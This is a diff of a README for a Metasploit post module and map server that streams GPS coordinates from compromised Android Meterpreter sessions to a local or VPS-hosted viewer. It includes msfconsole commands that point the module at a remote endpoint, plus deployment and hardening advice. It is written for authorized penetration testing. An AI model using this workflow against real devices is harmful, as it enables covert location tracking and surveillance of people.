@@ -1,64 +1,45 @@
 # msf-gps-map
 
-Local telemetry ingestion server and Metasploit post-exploitation module.
+Small GPS telemetry viewer and Metasploit post module for authorized Android
+security testing. Coordinates are kept in memory and displayed on a Leaflet
+map. The server works locally by default and can also run on a VPS.
 
-## Data Pipeline
+## How it works
 
-1. **Target:** An Android device runs the Meterpreter stager and
-   connects back to your Metasploit handler.
-2. **Operator (MSF):** The `gps_streamer` post module runs in a
-   background job, periodically pulling coordinates from the session
-   via `geolocate`.
-3. **Ingestion:** The module issues an HTTP POST with JSON data
-   (`{"lat": ..., "lon": ...}`) to the local server.
-4. **Visualization:** `map_server.py` receives the payload, stores it
-   in RAM, and `index.html` (Leaflet) polls `/api/points` to render
-   the path on a local map.
+1. An authorized Android Meterpreter session provides coordinates to the
+   `gps_streamer` post module, using `geolocate` or `wlan_geolocate`.
+2. The module posts `{"lat": ..., "lon": ...}` to the map server.
+3. `map_server.py` keeps up to 1,000 observations in RAM. The browser polls
+   `GET /api/points` to draw the route.
 
-## Tree
-
-```
-.
-├── gps_streamer.rb       # Metasploit module (pulls GPS from session & pushes via HTTP)
-├── index.html            # Frontend Leaflet map interface
-├── Makefile              # Automates offline asset vendoring & MSF module installation
-├── map_server.py         # Python telemetry backend (RAM-only store, loopback bound)
-├── README.md
-└── vendor_leaflet.py     # Fetches & verifies offline Leaflet 1.9.4 assets
-```
+The Metasploit operator sends HTTP requests directly to the map server.
+The Android session does not connect to the map server itself.
 
 ## Setup
 
-### 1. Fetch and verify offline Leaflet assets.
+Python 3 and Ruby (for the Metasploit module) are required. The map server
+uses only the Python standard library.
 
 ```sh
-make
+make                  # Fetch and integrity-check local Leaflet 1.9.4 assets
+make install-local    # Install the module into ~/.msf4/modules/
+make check            # Run tests; does not require Metasploit or Leaflet assets
 ```
 
-### 2. Install the Metasploit post module into your local tree (`~/.msf4/modules`):
+## Local use (default)
 
-```sh
-make install-local
-```
-
-## Usage
-
-### 1. Start the Map Server.
+Start the map server:
 
 ```sh
 python3 map_server.py
 ```
 
-Open <http://127.0.0.1:8765> in a browser.
+Open <http://127.0.0.1:8765>. No credentials are required unless you
+explicitly enable authentication.
 
-> [!IMPORTANT]
-> Requires internet connection for OpenStreetMap tiles.
+In `msfconsole`, after installing the module:
 
-### 2. Run the Metasploit Streamer.
-   
-In `msfconsole`:
-
-```
+```text
 msf6 > reload_all
 msf6 > use post/android/gather/gps_streamer
 msf6 post(android/gather/gps_streamer) > set SESSION <id>
@@ -66,45 +47,158 @@ msf6 post(android/gather/gps_streamer) > set INTERVAL 3
 msf6 post(android/gather/gps_streamer) > run -j
 ```
 
-### 3. Manual Testing (`curl`).
+The default `ENDPOINT` is `http://127.0.0.1:8765/api/position`.
+Stop the background job using `jobs -k <JobID>`.
 
-To test the ingestion server without an active session:
+For a different local port:
+
+```sh
+python3 map_server.py --port 9876
+```
+
+Set `ENDPOINT` to `http://127.0.0.1:9876/api/position` in the module.
+
+## VPS / network use
+
+`--bind` controls the listening IPv4 address (`127.0.0.1` by default),
+and `--port` the TCP port (`8765` by default). Both are optional.
+The server uses plain HTTP; **Basic authentication does not provide encryption**.
+Do not expose location history or credentials to the public Internet over HTTP.
+
+### 1. Set up optional authentication
+
+Create a private credential file on the server, outside the repository:
+
+```sh
+install -d -m 700 "$HOME/.config/msf-gps-map"
+umask 077
+printf 'operator:%s\n' "$(openssl rand -base64 32)" > "$HOME/.config/msf-gps-map/auth"
+chmod 600 "$HOME/.config/msf-gps-map/auth"
+```
+
+The file contains one ASCII `username:password` line. The first colon
+separates the fields; passwords may contain additional colons. The server
+reads the file at startup and rejects group/world-accessible files.
+Never commit this file to Git or pass credentials in a URL.
+
+Enable it with `--auth-file`:
+
+```sh
+python3 map_server.py --port 9876 --auth-file "$HOME/.config/msf-gps-map/auth"
+```
+
+A browser now prompts for the same credentials before displaying the map.
+`GET /`, static map assets, `GET /api/points`, and `POST /api/position` all
+require authentication. Without `--auth-file`, the original unauthenticated
+behavior is preserved.
+
+### 2. Make the map accessible remotely
+
+**Recommended for an Internet-facing VPS:** keep Python on loopback and
+put a TLS reverse proxy in front of it. For example, with Caddy and a
+DNS name pointing to your VPS:
+
+```caddyfile
+gps.example.com {
+    reverse_proxy 127.0.0.1:9876
+}
+```
+
+Keep TCP port 9876 blocked from external access; expose only HTTPS on 443.
+Open `https://gps.example.com/` in a browser. The reverse proxy must pass
+the `Authorization` and `Host` headers (Caddy does this by default).
+
+**For a private VPN or otherwise restricted network:** the server can listen
+on all IPv4 interfaces. The port must be reachable only by trusted clients:
+
+```sh
+python3 map_server.py --bind 0.0.0.0 --port 9876 \
+    --auth-file "$HOME/.config/msf-gps-map/auth"
+```
+
+The URL uses your VPS's actual IP or DNS name, **not** `0.0.0.0`.
+If you omit `--auth-file` in this mode, both GPS ingestion and the map
+history are accessible to anybody who can reach the port.
+
+### 3. Point the Metasploit module at the VPS
+
+On the Metasploit operator's machine:
+
+```text
+msf6 post(android/gather/gps_streamer) > set ENDPOINT https://gps.example.com/api/position
+msf6 post(android/gather/gps_streamer) > set MAP_USER operator
+msf6 post(android/gather/gps_streamer) > set MAP_PASSWORD <password-from-auth-file>
+msf6 post(android/gather/gps_streamer) > run -j
+```
+
+`MAP_USER` and `MAP_PASSWORD` are optional, but must be supplied together.
+They are HTTP Basic credentials for the map server, **not** the `API_KEY`
+used by `wlan_geolocate` as a fallback. Do not put the password into
+`ENDPOINT`. Metasploit's datastore, command history, and console recordings
+may expose values entered using `set`; protect them accordingly.
+
+The module enables TLS for `https://` URLs, uses the system's normal
+certificate validation, and reports non-2xx server responses as failures.
+Use a valid certificate rather than disabling verification.
+
+## Manual ingestion test
+
+With the default, unauthenticated local server:
 
 ```sh
 curl -fsS http://127.0.0.1:8765/api/position \
-     -H 'Content-Type: application/json' \
-     -d '{"lat":47.000,"lon":28.000}'
+    -H 'Content-Type: application/json' \
+    -d '{"lat":47.000,"lon":28.000}'
 ```
 
-## Specifications
+For an authenticated HTTPS server:
 
-* **Storage:** In-memory queue
-  (RAM only, capped at 1,000 points; wiped on exit).
-* **Security:** Bound strictly to 127.0.0.1. Validates incoming Host
-  and Origin headers.
-* **Endpoints:**
-  - `GET /api/points`
-  - `POST /api/position`
+```sh
+curl -fsS --user operator https://gps.example.com/api/position \
+    -H 'Content-Type: application/json' \
+    -d '{"lat":47.000,"lon":28.000}'
+```
+
+`curl --user operator` prompts for the password without including it in
+shell command history.
+
+## Notes
+
+- Observations are RAM-only, capped at 1,000 points, and erased when the
+  server exits. There is no persistence or per-device separation.
+- `GET /api/points` returns the full current history. Authentication protects
+  the viewer and the writer together, not as separate users or roles.
+- The server checks Host and Origin headers. Local unauthenticated use retains
+  strict loopback Host checking; remote Host names are accepted for network
+  listeners and authenticated reverse-proxy deployments.
+- Leaflet assets are vendored locally. An Internet connection is still needed
+  to load OpenStreetMap tiles. Tile requests can reveal the viewed area to the
+  tile provider.
+- A public Python `ThreadingHTTPServer` is not a hardened production HTTP
+  frontend. Use a reverse proxy, firewall, and sensible connection limits.
+
+## Project files
+
+```text
+map_server.py          Python HTTP server and in-memory store
+index.html             Leaflet map viewer
+gps_streamer.rb         Metasploit Android post module
+vendor_leaflet.py      Downloads and verifies pinned Leaflet assets
+tests/                 Python HTTP and Ruby transport tests
+Makefile               Vendor, install, and test commands
+```
 
 ## Disclaimer
 
-This software is designed strictly for authorized security research,
-educational demonstrations, and professional penetration testing with explicit
-prior consent. Unauthorized tracking, surveillance, or deployment against
-targets without explicit authorization is illegal. The author assumes no
-liability for misuse.
+Use only for authorized security research, educational demonstrations, and
+penetration tests with explicit consent. Unauthorized device tracking or
+surveillance is not permitted.
 
 ## License
 
-This project is free software licensed under the terms of the
-**GNU General Public License v3.0 or later (GPL-3.0-or-later)**.
-See the `COPYING` for license terms and `COPYRIGHT` for notices.
-
-Vendored Leaflet assets (`vendor/leaflet/`) are distributed under their
-respective BSD-2-Clause license.
+GPL-3.0-or-later; see `COPYING` and `COPYRIGHT`. Vendored Leaflet assets
+retain their BSD-2-Clause license.
 
 ## Acknowledgments
 
-* **Leaflet.js** for providing an exceptionally modular interactive mapping library.
-* **OpenStreetMap** contributors for map tile infrastructure.
-* **Rapid7 Metasploit Framework** for the post-exploitation framework architecture.
+Leaflet.js, OpenStreetMap contributors, and Rapid7 Metasploit Framework.
